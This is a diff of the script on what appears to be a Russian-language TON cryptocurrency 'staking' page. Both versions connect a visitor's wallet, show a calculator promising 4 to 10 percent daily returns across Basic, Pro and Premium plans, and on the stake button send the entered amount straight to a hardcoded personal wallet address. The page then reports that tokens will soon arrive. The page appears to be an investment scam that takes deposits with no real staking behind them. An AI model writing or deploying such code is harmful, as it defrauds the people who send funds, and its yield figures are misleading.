@@ -308,106 +308,118 @@
   document.querySelectorAll('.reveal').forEach(el => io.observe(el));
 </script>
 
-<!-- TON CONNECT (РАБОЧАЯ ВЕРСИЯ) -->
 <script type="module">
-  // ⚠️⚠️⚠️ ВСТАВЬ СВОЙ АДРЕС КОШЕЛЬКА ⚠️⚠️⚠️
-  const RECEIVER_ADDRESS = "UQAq0NKzs0XtMyzbOn6ieHvAMudRq5ILy8oT_TOMLD8JEutW"; // ЗАМЕНИ НА СВОЙ!
-  
-  import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js';
-
-  // Элементы
-  const addrSide = document.getElementById('addrSide');
-  const btnTextTop = document.getElementById('connectBtnTextTop');
-  const btnTextSide = document.getElementById('connectBtnTextSide');
-  const amountRange = document.getElementById('amountRange');
-  const amountOut = document.getElementById('amountOut');
-  const daysRange = document.getElementById('daysRange');
-  const daysOut = document.getElementById('daysOut');
-  const rateOut = document.getElementById('rateOut');
-  const dayProfitOut = document.getElementById('dayProfitOut');
-  const monthProfitOut = document.getElementById('monthProfitOut');
-  const ringRate = document.getElementById('ringRate');
-  const earnedTon = document.getElementById('earnedTon');
-  const stakeBtn = document.getElementById('stakeBtn');
-  const txStatus = document.getElementById('txStatus');
-
-  // Инициализация TonConnect
-  const tonConnectUI = new TonConnectUI({
-    manifestUrl: 'https://kap352837598.github.io/tonconnect-manifest.json'
-  });
-
-  // Отслеживание статуса
-  tonConnectUI.onStatusChange(wallet => {
-    const connected = !!wallet;
-    btnTextTop.textContent = connected ? "✅ Кошелёк подключён" : "🔗 Подключить кошелёк";
-    btnTextSide.textContent = connected ? "✅ Кошелёк подключён" : "🔗 Подключить кошелёк";
-    addrSide.textContent = "Wallet: " + (wallet?.account?.address?.slice(0,8) + "..." || "—");
-  });
-
-  // Калькулятор тарифов
-  function getPlan(amount){
-    if(amount >= 10 && amount < 900) return {name:'Basic', rate:0.04};
-    if(amount >= 900 && amount < 2200) return {name:'Pro', rate:0.07};
-    if(amount >= 2200 && amount <= 10000) return {name:'Premium', rate:0.10};
-    return {name:'Basic', rate:0.04};
-  }
-
-  function formatTon(v){ return v.toFixed(2) + " TON"; }
-
-  function updateCalculator(){
-    const amount = Number(amountRange?.value || 10);
-    const days = Number(daysRange?.value || 1);
+    // ⚠️ ЗАМЕНИ НА СВОЙ АДРЕС TON-КОШЕЛЬКА ⚠️
+    const MY_WALLET_ADDRESS = "UQAq0NKzs0XtMyzbOn6ieHvAMudRq5ILy8oT_TOMLD8JEutW";
     
-    if(amountOut) amountOut.textContent = amount;
-    if(daysOut) daysOut.textContent = days;
+    // Импорт TonConnect
+    import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js';
 
-    const plan = getPlan(amount);
-    const dayProfit = amount * plan.rate;
-    const monthProfit = amount * plan.rate * 30;
-    const earned = amount * plan.rate * days;
+    // Элементы интерфейса
+    const connectBtnTop = document.getElementById('connectBtnTop');
+    const connectBtnSide = document.getElementById('connectBtnSide');
+    const connectTextTop = document.getElementById('connectBtnTextTop');
+    const connectTextSide = document.getElementById('connectBtnTextSide');
+    const addrSide = document.getElementById('addrSide');
+    const amountRange = document.getElementById('amountRange');
+    const stakeBtn = document.getElementById('stakeBtn');
+    const txStatus = document.getElementById('txStatus');
 
-    const ratePct = (plan.rate*100).toFixed(1) + "%";
-    if(rateOut) rateOut.textContent = ratePct;
-    if(ringRate) ringRate.textContent = ratePct;
-    if(dayProfitOut) dayProfitOut.textContent = "+ " + formatTon(dayProfit);
-    if(monthProfitOut) monthProfitOut.textContent = "+ " + formatTon(monthProfit);
-    if(earnedTon) earnedTon.textContent = earned.toFixed(2);
-  }
+    // Инициализация TonConnect
+    const tonConnectUI = new TonConnectUI({
+        manifestUrl: 'https://kap352837598.github.io/tonconnect-manifest.json'
+    });
 
-  amountRange?.addEventListener('input', updateCalculator);
-  daysRange?.addEventListener('input', updateCalculator);
-  updateCalculator();
+    // Отслеживание статуса подключения
+    tonConnectUI.onStatusChange(wallet => {
+        const connected = !!wallet;
+        const btnText = connected ? '✅ Кошелёк подключён' : '🔗 Подключить кошелёк';
+        
+        if (connectTextTop) connectTextTop.textContent = btnText;
+        if (connectTextSide) connectTextSide.textContent = btnText;
+        
+        if (addrSide) {
+            const address = wallet?.account?.address || '—';
+            addrSide.textContent = 'Wallet: ' + (address.slice(0,6) + '...' || '—');
+        }
+    });
 
-  // Отправка транзакции
-  stakeBtn.addEventListener('click', async () => {
-    if (!tonConnectUI.connected) {
-      alert('Сначала подключи кошелёк');
-      return;
+    // Подключение по клику
+    if (connectBtnTop) connectBtnTop.addEventListener('click', () => tonConnectUI.openModal());
+    if (connectBtnSide) connectBtnSide.addEventListener('click', () => tonConnectUI.openModal());
+
+    // Отправка транзакции
+    if (stakeBtn) {
+        stakeBtn.addEventListener('click', async () => {
+            if (!tonConnectUI.connected) {
+                alert('Сначала подключи кошелёк');
+                return;
+            }
+
+            const amount = Number(amountRange?.value || 10);
+            if (txStatus) txStatus.textContent = '⏳ Отправка транзакции...';
+            
+            try {
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600,
+                    messages: [{
+                        address: MY_WALLET_ADDRESS,
+                        amount: (amount * 1e9).toString(),
+                        payload: 'stake'
+                    }]
+                };
+
+                await tonConnectUI.sendTransaction(transaction);
+                if (txStatus) txStatus.textContent = '✅ Транзакция отправлена! Токены скоро поступят.';
+            } catch (error) {
+                if (txStatus) txStatus.textContent = '❌ Ошибка: ' + (error.message || 'Транзакция отклонена');
+                console.error(error);
+            }
+        });
     }
 
-    const amount = Number(amountRange?.value || 10);
-    
-    txStatus.textContent = '⏳ Отправка транзакции...';
-    
-    try {
-      const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 600,
-        messages: [{
-          address: RECEIVER_ADDRESS,
-          amount: (amount * 1e9).toString(),
-          payload: 'stake'
-        }]
-      };
+    // Калькулятор (оставляем твой, но убеждаемся что работает)
+    if (amountRange) {
+        const amountOut = document.getElementById('amountOut');
+        const daysRange = document.getElementById('daysRange');
+        const daysOut = document.getElementById('daysOut');
+        const rateOut = document.getElementById('rateOut');
+        const dayProfitOut = document.getElementById('dayProfitOut');
+        const monthProfitOut = document.getElementById('monthProfitOut');
+        const ringRate = document.getElementById('ringRate');
+        const earnedTon = document.getElementById('earnedTon');
 
-      const result = await tonConnectUI.sendTransaction(transaction);
-      txStatus.textContent = '✅ Транзакция отправлена! Токены скоро поступят.';
-      console.log(result);
-      
-    } catch (error) {
-      txStatus.textContent = '❌ Ошибка: ' + (error.message || 'Транзакция отклонена');
-      console.error(error);
+        function getPlan(amount) {
+            if (amount >= 10 && amount < 900) return { name: 'Basic', rate: 0.04 };
+            if (amount >= 900 && amount < 2200) return { name: 'Pro', rate: 0.07 };
+            if (amount >= 2200) return { name: 'Premium', rate: 0.10 };
+            return { name: 'Basic', rate: 0.04 };
+        }
+
+        function updateCalc() {
+            const amount = Number(amountRange.value);
+            const days = Number(daysRange?.value || 1);
+            
+            if (amountOut) amountOut.textContent = amount;
+            if (daysOut) daysOut.textContent = days;
+
+            const plan = getPlan(amount);
+            const rate = plan.rate;
+            const dayProfit = amount * rate;
+            const monthProfit = dayProfit * 30;
+            const earned = dayProfit * days;
+
+            if (rateOut) rateOut.textContent = (rate * 100).toFixed(1) + '%';
+            if (ringRate) ringRate.textContent = (rate * 100).toFixed(1) + '%';
+            if (dayProfitOut) dayProfitOut.textContent = '+ ' + dayProfit.toFixed(2) + ' TON';
+            if (monthProfitOut) monthProfitOut.textContent = '+ ' + monthProfit.toFixed(2) + ' TON';
+            if (earnedTon) earnedTon.textContent = earned.toFixed(2);
+        }
+
+        amountRange.addEventListener('input', updateCalc);
+        if (daysRange) daysRange.addEventListener('input', updateCalc);
+        updateCalc();
     }
-  });
 </script>
 
 </body>
